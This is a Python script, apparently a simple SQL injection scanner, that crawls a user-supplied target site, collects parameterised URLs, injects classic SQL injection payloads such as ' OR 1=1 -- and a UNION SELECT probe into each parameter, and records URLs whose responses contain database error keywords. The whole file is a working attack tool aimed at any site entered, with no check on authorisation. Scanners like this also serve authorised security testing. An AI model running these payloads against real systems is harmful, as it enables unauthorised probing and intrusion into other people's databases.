import requests
from urllib.parse import urlparse, urljoin, parse_qs
from bs4 import BeautifulSoup

visited = set()
found_sql_vulns = []

sql_payloads = [
    "' OR 1=1 --",
    "' UNION SELECT NULL, NULL --",
    "\" OR \"1\"=\"1"
]

def is_valid_url(url):
    return url.startswith("http") and "=" in url

def crawl_and_find_params(base_url):
    to_visit = [base_url]
    param_urls = set()

    while to_visit:
        current_url = to_visit.pop()
        if current_url in visited:
            continue
        visited.add(current_url)

        try:
            response = requests.get(current_url, timeout=5)
            if "text/html" not in response.headers.get("Content-Type", ""):
                continue
            soup = BeautifulSoup(response.text, "html.parser")
            for link in soup.find_all("a", href=True):
                href = urljoin(base_url, link['href'])
                if base_url not in href:
                    continue
                if is_valid_url(href):
                    param_urls.add(href)
                if href not in visited:
                    to_visit.append(href)
        except Exception:
            continue

    return list(param_urls)

def test_sql_injection_on_url(url):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)

    for param in query:
        for payload in sql_payloads:
            modified_query = {**query}
            modified_query[param] = payload
            new_query = "&".join([f"{k}={v}" for k, v in modified_query.items()])
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            try:
                response = requests.get(test_url, timeout=5)
                if any(err in response.text.lower() for err in ["sql", "mysql", "syntax", "error", "warning"]):
                    found_sql_vulns.append((test_url, payload))
                    return True
            except Exception:
                continue
    return False

def run_sqlfinder():
    target = input("🔗 Enter target URL (e.g. https://site.com): ").strip()
    print("⏳ Crawling and scanning...")

    found_urls = crawl_and_find_params(target)

    for url in found_urls:
        test_sql_injection_on_url(url)

    with open("sqlfinder_report.txt", "w", encoding="utf-8") as f:
        f.write("🛡️ SQL Injection Report\n")
        f.write("=======================\n")
        if found_sql_vulns:
            for vuln_url, payload in found_sql_vulns:
                f.write(f"[+] Found SQL Injection: {vuln_url}\nPayload: {payload}\n\n")
        else:
            f.write("[-] No SQL Injection found.\n")

    print("✅ Scan complete. Report saved as sqlfinder_report.txt")


if __name__ == "__main__":
    run_sqlfinder()
print("Programmer/Developer: Erfan Mohammadi .")